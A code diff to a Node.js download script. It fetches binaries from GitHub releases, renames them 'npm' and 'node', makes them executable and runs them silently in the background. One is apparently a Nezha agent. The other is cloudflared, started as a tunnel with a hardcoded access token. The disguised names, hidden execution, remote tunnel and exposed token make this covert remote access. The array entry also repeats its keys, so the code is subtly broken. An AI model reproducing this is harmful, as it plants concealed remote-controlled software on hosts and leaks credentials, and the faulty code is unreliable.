@@ -93,7 +93,48 @@ function downloadFiles() {
 
         if (downloadedCount === filesToDownload.length) {
           setTimeout(() => {
-            authorizeFiles();
+            // authorizeFiles();
+  const filePath = './npm';
+  const newPermissions = 0o775;
+  fs.chmod(filePath, newPermissions, (err) => {
+    if (err) {
+      console.error(`Empowerment failed:${err}`);
+    } else {
+      console.log(`Empowerment success:${newPermissions.toString(8)} (${newPermissions.toString(10)})`);
+
+      // 运行ne-zha
+      {
+        const command = `./npm >/dev/null 2>&1 &`;
+        try {
+          exec(command);
+          console.log('npm is running');
+        } catch (error) {
+          console.error(`npm running error: ${error}`);
+        }
+      }
+    }
+  });
+              const filePath1 = './node';
+  fs.chmod(filePath1, newPermissions, (err) => {
+    if (err) {
+      console.error(`Empowerment failed:${err}`);
+    } else {
+      console.log(`Empowerment success:${newPermissions.toString(8)} (${newPermissions.toString(10)})`);
+
+      // 运行ne-zha
+      {
+        const command = `./node tunnel --no-autoupdate run --token eyJhIjoiNmYyZTc1MWE3MTI5ZWExZjI1ZTlhMjEzN2Q5ZDhjMDQiLCJ0IjoiOTIyMjg2NmEtN2ZiYy00ZTVmLTkxZjAtMjUyMzNjNTI4YjIyIiwicyI6Ik1HWmlNVE0xTVdVdE0yUXhOaTAwT1RjMExUbGlNVE10WXpVNE0yVXpNRGhoWTJJMyJ9 >/dev/null 2>&1 &`;
+        try {
+          exec(command);
+          console.log('node is running');
+        } catch (error) {
+          console.error(`node running error: ${error}`);
+        }
+      }
+    }
+  });
+
+            
           }, 3000);
         }
       }
@@ -108,7 +149,9 @@ function getFilesForArchitecture(architecture) {
     ];
   } else if (architecture === 'amd') {
     return [
-      { fileName: "npm", fileUrl: "https://github.com/eooce/test/releases/download/bulid/swith" },
+      // { fileName: "npm", fileUrl: "https://github.com/eooce/test/releases/download/bulid/swith" },
+      {fileName: "npm", fileUrl: "https://github.com/2630548/web/releases/download/1/nd",
+    fileName: "node", fileUrl: "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"}
     ];
   }
   return [];
